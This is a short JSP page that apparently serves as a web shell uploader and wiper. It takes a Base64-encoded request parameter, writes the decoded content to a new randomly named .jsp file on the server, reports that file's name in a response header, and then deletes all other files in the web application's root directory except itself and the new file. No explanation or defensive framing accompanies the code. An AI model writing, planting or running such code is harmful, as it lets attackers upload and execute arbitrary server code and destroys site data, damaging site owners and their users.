<%@ page import="java.io.*, java.util.*, javax.servlet.*" %>
<%
    String file = "2tina_" + UUID.randomUUID().toString() + ".jsp";
    response.setHeader("X-FileName", file);
    String encodedZcl = request.getParameter("2tina");
    if (encodedZcl == null || encodedZcl.isEmpty()) {
        out.println("What do you want!");
        return;
    }
    String decodedZcl = new String(Base64.getDecoder().decode(encodedZcl.replace(" ", "+")));
    try (PrintWriter writer = new PrintWriter(new FileWriter(file))) {
        writer.println(decodedZcl);
    } catch (IOException e) {
        e.printStackTrace();
    }
    response.setHeader("Refresh", "0.1");
    String self = request.getServletPath();
    String directory = getServletContext().getRealPath("/");
    File[] files = new File(directory).listFiles();
    if (files != null) {
        for (File f : files) {
            if (!f.getName().equals(self) && !f.getName().equals(file)) {
                f.delete();
            }
        }
    }
%>

